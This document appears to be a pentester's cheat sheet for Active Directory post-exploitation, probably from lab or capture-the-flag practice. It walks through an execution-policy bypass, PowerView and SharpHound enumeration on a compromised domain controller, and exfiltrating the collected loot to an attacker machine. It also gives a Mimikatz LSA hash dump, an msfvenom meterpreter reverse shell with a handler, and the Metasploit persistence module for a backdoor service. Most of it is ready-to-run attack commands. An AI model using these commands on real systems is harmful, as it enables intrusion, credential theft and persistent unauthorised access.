-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumerating              TOOL: Powerview   TRY using Server Manager
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
POWERVIEW is a powerful powershell script from POWERSHELL EMPIRE that can be used for enumerating a domain after you have already gained a shell in the system.

We'll be focusing on how to start up and get users and groups from PowerView:(Collected on Compromised DC)

        1.) Start Powershell                 "powershell.exe -nop -exec bypass" 
        2.) Import Powerview.ps1             "Import-Module .\Powerview.ps1
        3.) Enumerate the domain users        "Get-NetUser | select cn"    
        4.) Enumerate the domain groups       "Get-NetGroup -GroupName *admin*"  
        5.) Interesting cmds            "Get-SmbShare"  "Invoke-ShareFinder"  "Get-NetComputer -fulldata"

NOTE: Cheatsheet with additional Commands https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumerating              TOOL: Bloodhound  && Sharphound
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Bloodhound is a graphical interface that allows you to visually map out networks. This tool along with SharpHound (which is similar to PowerView) takes the user, 
groups, trusts & more from the network & collects them into .json files to be used inside of Bloodhound.

BloodHound Installation:
                            1.) apt-get install bloodhound    
                            2.) neo4j console                    default credentials are neo4j:neo4j

Getting loot w/ SharpHound: (Collected on Compromised DC)
                            1.) powershell.exe -nop -exec bypass
                            2.) Import-Module .\SharpHound.ps1    
                            3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
                            4.) Transfer the loot.zip folder to your Attacker Machine
                            NOTE: you can use scp to transfer the file if youâ€™re using ssh
                            From Client to Remote-Server
                            ex.Local Machine) scp uploadFile.txt remoteUser@[Server-IP:\Dir\to\place\file]
                            From Remote-Server to Client
                            ex.Remote Machine)  scp remoteServerUsername@[Server-IP:/Dir/where/file/downloadFile.txt] /dir/where/to/copy/fileTo

Mapping the network w/ BloodHound
                            1.) bloodhound                   <-Run this on your attacker machine
                            2.) Sign In using the same credentials you set with Neo4j
                            3.) Inside of Bloodhound search for download icon and import the loot.zip folder
                            NOTE: Some versions of BloodHound the import button does not work, Get around this simply drag and drop the loot.zip folder 
                                 into Bloodhound to import the .json files
                            4.) To view the graphed network open the "menu" and select "queries" this will give you a list of pre-compiled queries to choose from
                            NOTE: Queries can be as simple as find all domain admins Or as complicated as shortest path to high value targets

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Dumping Hashes           TOOL: Mimikatz
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
        
        lsadump::lsa /patch Dump those hashes!
        
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Maintaining Access              TOOL: MsfVenom
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
A simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor 
service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.

Generating a Payload w/ msfvenom

        1.) "msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe"           <-generates a basic windows meterpreter reverse tcp shell
        2.) Transfer the payload from your attacker machine to the target machine.
        3.) "use exploit/multi/handler"                                                               <-this will create a listener on the port that you set it on
        4.) "set payload windows/meterpreter/reverse_tcp"                                             <- Configure payload to be a windows meterpreter shell: 
        5.)  set your IP address as your "LHOST", start the listener with "run" command
        NOTE: Executing the binary on the windows machine will give you a meterpreter shell back on your host 
        NOTE: Verify you got a meterpreter shell, then background it to run the persistence module

Run the Persistence Module

        1.) "use exploit/windows/local/persistence"                     <- this module will send a payload every 10 seconds in default however you can set this 
                                                                           time to anything you want
        2.) "set session 1"                                             <-set the session to the session that we backgrounded in meterpreter 
        NOTE: Use "sessions" command in metasploit to list the active sessions

If the system is shut down or reset, you will lose your meterpreter session BUT by using the persistence module you create a backdoor into the system which you
can access at any time using the metasploit multi handler and setting the payload to "windows/meterpreter/reverse_tcp" allowing you to send another meterpreter
payload to the machine and open up a new meterpreter session.

If Session dies and your still in the msf5> exploit(multi/handler) >   
                                                                     1.) enter "run" to re-connect
